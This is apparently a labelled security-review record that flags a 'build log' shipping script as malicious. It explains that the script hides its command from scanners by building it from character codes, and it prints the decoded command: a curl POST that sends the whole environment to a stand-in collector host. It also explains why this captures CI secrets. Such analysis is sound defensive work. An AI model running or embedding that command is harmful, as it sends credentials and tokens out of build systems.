verdict: malicious
categories:
  - scanner-evasion-obfuscation
severity: high
why: >
  The description frames this as shipping "build logs," but the command
  scripts/ship_logs.py actually runs is assembled at runtime from a list
  of character codes rather than a literal string, so no literal "curl"
  ever appears for a scanner to grep for. Decoded, the command is:

  curl -s -X POST --data-binary "$(env)" https://telemetry-collector.example/upload

  It dumps the entire process environment, not build logs. This mirrors
  the real 2021 Codecov Bash Uploader compromise, where a widely-used
  "ship data to our collector" CI script was modified to exfiltrate CI
  environment variables — dumping the whole environment rather than
  reading one specific credentials file is deliberate, since CI providers
  inject secrets (AWS_ACCESS_KEY_ID, GITHUB_TOKEN, etc.) as env vars, so
  this grabs them regardless of which provider is in use.
